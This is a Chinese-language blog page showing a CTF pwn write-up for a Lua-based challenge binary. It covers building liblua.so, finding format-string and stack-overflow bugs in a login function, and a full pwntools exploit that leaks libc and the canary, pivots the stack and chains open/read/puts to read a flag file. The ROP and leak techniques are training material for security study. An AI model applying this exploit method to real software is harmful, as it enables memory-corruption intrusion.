@@ -1,0 +1,197 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Torebtr,2338442533@qq.com"><meta name="copyright" content="Torebtr"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>pwn_lua | Torebtr'blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"torebtr.github.io","root":"/","title":"TOR的小站","version":"1.5.1","mode":"auto","copycode":true,"page":{"isPost":true},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Torebtr'blog" type="application/atom+xml"><meta name="description" content="记一道lua题目这道题是队内一个师傅发的，因为之前没有接触过lua方面的题目，这道题又不是特别难，所以记一下来入门。特此鸣谢ymt师傅和eur1ka师傅 https:&#x2F;&#x2F;github.com&#x2F;Torebtr&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;lua 环境这个题目比较特殊，除了基本的libc环境，还需要liblua.so动态文件，这就要自行编译了  https:&#x2F;&#x2F;www.lua.org&#x2F;ftp&#x2F;  从上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn_lua">
+<meta property="og:url" content="https://torebtr.github.io/2021/10/29/pwn-lua/index.html">
+<meta property="og:site_name" content="Torebtr&#39;blog">
+<meta property="og:description" content="记一道lua题目这道题是队内一个师傅发的，因为之前没有接触过lua方面的题目，这道题又不是特别难，所以记一下来入门。特此鸣谢ymt师傅和eur1ka师傅 https:&#x2F;&#x2F;github.com&#x2F;Torebtr&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;lua 环境这个题目比较特殊，除了基本的libc环境，还需要liblua.so动态文件，这就要自行编译了  https:&#x2F;&#x2F;www.lua.org&#x2F;ftp&#x2F;  从上">
+<meta property="og:locale">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211021224042235.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211021224853422-1634827734008.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211021224917007.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029091352191.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029093830682.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029211855769.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029212859222.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029211948877.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029212657465.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029212407559.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029212448298.png">
+<meta property="og:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211029213430140.png">
+<meta property="article:published_time" content="2021-10-29T15:41:52.000Z">
+<meta property="article:modified_time" content="2021-10-29T15:42:33.871Z">
+<meta property="article:author" content="Torebtr">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="g:/new_blog/source_posts/pwn-lua.assets/image-20211021224042235.png"><script src="/js/ui/mode.js"></script>
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Torebtr"><img width="96" loading="lazy" src="/6.jpg" alt="Torebtr"></a><div class="site-author-name"><a href="/about/">Torebtr</a></div><a class="site-name" href="/about/site.html">Torebtr'blog</a><sub class="site-subtitle"></sub><div class="site-desciption">一只从pwn走向全栈的菜鸡</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://wiki.x10sec.org/" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Torebtr" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/u/7466379217" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=1477978576" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/torebtr" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/435886015" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="2338442533@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E9%81%93lua%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">记一道lua题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BF%AE%E6%94%B9%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84Makefile"><span class="toc-number">1.1.1.</span> <span class="toc-text">第一步：修改根目录下的Makefile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%BF%AE%E6%94%B9src-Makefile"><span class="toc-number">1.1.2.</span> <span class="toc-text">第二步：修改src&#x2F;Makefile</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CFLAGS%E5%A2%9E%E5%8A%A0-fPIC%E9%80%89%E9%A1%B9"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">CFLAGS增加-fPIC选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%A2%9E%E7%9B%AE%E6%A0%87%E8%BE%93%E5%87%BA"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">新增目标输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9ALL-T%E5%80%BC"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">修改ALL_T值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E5%8A%A8%E6%80%81%E5%BA%93%E7%9A%84%E7%BC%96%E8%AF%91%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">增加动态库的编译依赖关系</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">ida反编译</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">login函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">栈溢出</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://torebtr.github.io/2021/10/29/pwn-lua/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Torebtr,2338442533@qq.com"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Torebtr'blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pwn_lua</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2021-10-29 23:41:52" itemprop="dateCreated datePublished" datetime="2021-10-29T23:41:52+08:00">2021-10-29</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/heap/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">heap</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="记一道lua题目"><a href="#记一道lua题目" class="headerlink" title="记一道lua题目"></a>记一道lua题目</h1><p>这道题是队内一个师傅发的，因为之前没有接触过lua方面的题目，这道题又不是特别难，所以记一下来入门。特此鸣谢ymt师傅和eur1ka师傅</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Torebtr/ctf/tree/main/lua">https://github.com/Torebtr/ctf/tree/main/lua</a></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>这个题目比较特殊，除了基本的libc环境，还需要liblua.so动态文件，这就要自行编译了</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.lua.org/ftp/">https://www.lua.org/ftp/</a></p>
+</blockquote>
+<p>从上面的网站下载lua源码，扔到ubuntu中，然后修改makefile</p>
+<h3 id="第一步：修改根目录下的Makefile"><a href="#第一步：修改根目录下的Makefile" class="headerlink" title="第一步：修改根目录下的Makefile"></a>第一步：修改根目录下的Makefile</h3><pre class="language-makefile" data-language="makefile"><code class="language-makefile">TO_LIB= liblua.a
+#==&gt;&gt;
+TO_LIB= liblua.a liblua.so</code></pre>
+
+<h3 id="第二步：修改src-Makefile"><a href="#第二步：修改src-Makefile" class="headerlink" title="第二步：修改src/Makefile"></a>第二步：修改src/Makefile</h3><h4 id="CFLAGS增加-fPIC选项"><a href="#CFLAGS增加-fPIC选项" class="headerlink" title="CFLAGS增加-fPIC选项"></a>CFLAGS增加-fPIC选项</h4><h4 id="新增目标输出"><a href="#新增目标输出" class="headerlink" title="新增目标输出"></a>新增目标输出</h4><p>位置大概是随意，或者添加到与lua.o紧邻的位置</p>
+<pre class="language-makefile" data-language="makefile"><code class="language-makefile">LUA_SO= liblua.so</code></pre>
+
+<h4 id="修改ALL-T值"><a href="#修改ALL-T值" class="headerlink" title="修改ALL_T值"></a>修改ALL_T值</h4><pre class="language-makefile" data-language="makefile"><code class="language-makefile">##原文件
+ALL_T= $(LUA_A) $(LUA_T) $(LUAC_T)
+#==&gt;&gt;
+ALL_T= $(LUA_A) $(LUA_T) $(LUAC_T) $(LUA_SO)</code></pre>
+
+<h4 id="增加动态库的编译依赖关系"><a href="#增加动态库的编译依赖关系" class="headerlink" title="增加动态库的编译依赖关系"></a>增加动态库的编译依赖关系</h4><pre class="language-makefile" data-language="makefile"><code class="language-makefile">$(LUA_SO): $(CORE_O) $(LIB_O)
+    $(CC) -o $@ -shared $? -ldl -lm</code></pre>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6347baf5fc35">参考博客</a></p>
+</blockquote>
+<p>然后将编译出来的文件扔到/lib/x86_64-linux-gnu目录下即可</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>装完环境后可以直接运行文件，是下面图片中的样子</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211021224042235.png" alt="image-20211021224042235" loading="lazy"></p>
+<p>进入正题，先查看基本信息</p>
+<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211021224853422-1634827734008.png" alt="image-20211021224853422" loading="lazy"></p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211021224917007.png" alt="image-20211021224917007" loading="lazy"></p>
+<p>保护全开，在我的印象里，这种保护全开的大概是堆题，好巧不巧，这是一道栈题，主要难点在于栈迁移，好嘛，又是一个我不熟悉的知识点，来吧。</p>
+<h3 id="ida反编译"><a href="#ida反编译" class="headerlink" title="ida反编译"></a>ida反编译</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029091352191.png" alt="image-20211029091352191" loading="lazy"></p>
+<p>用处不是很大，但是会发现调用了ezcmd.lua这个文件</p>
+<h4 id="login函数"><a href="#login函数" class="headerlink" title="login函数"></a>login函数</h4><p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029093830682.png" alt="image-20211029093830682" loading="lazy"></p>
+<p>非常重要的函数，会发现他有格式化字符串漏洞和栈溢出漏洞</p>
+<h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><p>这部分主要是用来泄露libc基址和canary的</p>
+<p>在此解释一下接下来exp中的部分语句：</p>
+<pre class="language-none"><code class="language-none">p.sendline("%107$p##%11$p")</code></pre>
+
+<p>这个分为两部分：</p>
+<p>第一部分是%107$p</p>
+<p>107的来源ymt师傅在他的exp中写的是</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029211855769.png" alt="image-20211029211855769" loading="lazy"></p>
+<p>但是在我调试的过程中发现不是这一个</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029212859222.png" alt="image-20211029212859222" loading="lazy"></p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029211948877.png" alt="image-20211029211948877" loading="lazy"></p>
+<p>因为很容易发现，计数是从2开始的，01为我们输入的参数</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029212657465.png" alt="image-20211029212657465" loading="lazy"></p>
+<p>又因为64位程序前六个参数由寄存器传递，所以0x65+6=107</p>
+<p>这样我们可以泄露libc基址</p>
+<p>第二部分是%11$p</p>
+<p>这一块很好理解，canary在rbp-8处</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029212407559.png" alt="image-20211029212407559" loading="lazy"></p>
+<p>直接调试就可发现是5+6=11</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029212448298.png" alt="image-20211029212448298" loading="lazy"></p>
+<p>此处的6还是寄存器</p>
+<p>这样两个格式化字符串的参数就很好解释了。</p>
+<h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><p>这个题的难点在于要构造orw，因为开启了沙箱</p>
+<p><img src="G:\new_blog\source_posts\pwn-lua.assets\image-20211029213430140.png" alt="image-20211029213430140" loading="lazy"></p>
+<p>因为有栈溢出，但是不能直接调用getshell的函数，所以可以写orw，两种思路，一种是写在free_hook上，另一种就是在.bss段上找一块可读可写可执行的区域，应该是都可以。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="language-python" data-language="python"><code class="language-python">#coding:utf8
+from pwn import *
+context.log_level="debug"
+p=process("./pwn3")
+#p = remote("10.103.16.3",80)#2 3 5 6 10
+elf=ELF("./pwn3")
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+
+p.recvuntil("$ ")
+p.sendline("login")
+p.recvuntil("user:")
+#gdb.attach(p)
+p.sendline("%107$p##%11$p")
+'''
+66:0330│      0x7fffffffde18 —▸ 0x7ffff7d7f0b3 (__libc_start_main+243) ◂— mov    edi, eax
+
+pwndbg&gt; p 0x330/8+5  5--&gt;寄存器数量
+$1 = 107
+
+65:0328│   0x7ffdee745618 —▸ 0x7ff3607fc0b3 (__libc_start_main+243) ◂— mov    edi, eax
+
+pwndbg&gt; p 0x328/8+6
+$2 = 107
+
+pwndbg&gt; p 0x65+6   0x66+5
+$2 = 107
+
+06:0030│      0x7fffffffdb18 ◂— 0x382ce7b98064fd00
+07:0038│ rbp  0x7fffffffdb20 —▸ 0x5555555592a8 ◂— 0x0
+canary rbp-8          6+5
+
+'''
+p.recvuntil("0x")
+libc_base=int(p.recv(12),16)
+print "libc_base : "+hex(libc_base)
+libc_base=libc_base-243-libc.sym['__libc_start_main']
+print "libc_base : "+hex(libc_base) 
+
+p.recvuntil("##0x")
+
+canary=int(p.recv(16),16)
+print "canary : "+hex(canary) 
+
+p.recvuntil("passwd:")
+#gdb.attach(p)
+#main_addr=
+sys_addr = libc_base+libc.symbols['system']
+sh_addr = libc_base+libc.search('/bin/sh').next()
+pop_rdi_ret = libc_base+0x26b72
+#$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop|ret" | grep rdi
+print "sys_addr : "+hex(sys_addr) 
+print "sh_addr : "+hex(sh_addr) 
+print "pop_rdi_ret : "+hex(pop_rdi_ret) 
+print "one : "+hex(libc_base+0xe6c7e) 
+
+'''
+#pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)
+#pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(libc_base+0xe6c7e)#0xe6c81 0xe6c84
+#pd = 'a'*0x18+p64(canary)+p64(0x7f09f76371e3)+ p64(0x7f09f76371e3)#0xe6c81 0xe6c84
+#p.sendline(pd)
+'''
+
+open_addr=libc_base+libc.symbols['open']
+read_addr=libc_base+libc.symbols['read']
+puts_addr=libc_base+libc.symbols['puts']
+
+__free_hook=libc_base+libc.symbols['__free_hook']#libc.symbols['__free_hook']#0x1eb000(no ok)
+
+
+pop_rdx_ret=libc_base+0x11c371      #0x000000000011c371: pop rdx; pop r12; ret;
+pop_rsi_ret=libc_base+0x27529
+leave_ret=libc_base+0x5aa48 
+
+print "open_addr is "+hex(open_addr)
+print "read_addr is "+hex(read_addr)
+print "free_hook is "+hex(__free_hook)
+
+print "pop_rdi_ret is "+hex(pop_rdi_ret)
+print "pop_rdi_ret is "+hex(pop_rdi_ret)
+print "pop_rsi_ret is "+hex(pop_rsi_ret)
+print "leave_ret is "+hex(leave_ret)
+
+pd='a'*0x18+p64(canary)+p64(__free_hook)
+pd+=p64(pop_rsi_ret)+p64(__free_hook+0x8)+p64(pop_rdi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)+p64(leave_ret)
+
+#gdb.attach(p)
+p.send(pd)
+
+pd=p64(pop_rdi_ret)+p64(__free_hook+0xa0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x0)+p64(0)+p64(open_addr) ##open("file_addr",oflag) 72 0
+pd+=p64(pop_rsi_ret)+p64(__free_hook+0x100)+p64(pop_rdi_ret)+p64(3)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)
+#read(fd,*buf,100)
+pd+=p64(pop_rdi_ret)+p64(__free_hook+0x100)+p64(puts_addr) 
+#puts()
+pd+="./flag\x00"
+p.send(pd)
+
+print "len=&gt;",hex(len(pd))
+
+p.interactive()</code></pre>
+
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="alipay.jpg"><img loading="lazy" src="/alipay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="wechat.jpg"><img loading="lazy" src="/wechat.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Torebtr,2338442533@qq.com</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://torebtr.github.io/2021/10/29/pwn-lua/" title="pwn_lua">https://torebtr.github.io/2021/10/29/pwn-lua/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/31/heap-%E4%B9%B1/" rel="next" title="heap学习(乱)"><span class="post-nav-text">heap学习(乱)</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>点击按钮跳转 GitHub Issues 评论。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/Torebtr/torebtr.github.io/issues?q=is:issue+pwn_lua">GitHub Issues</a><a class="hty-button hty-button--raised" id="github-discussions" target="_blank" rel="noopener" href="https://github.com/Torebtr/torebtr.github.io/discussions/new">GitHub Discussions</a></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Torebtr</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.1</span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
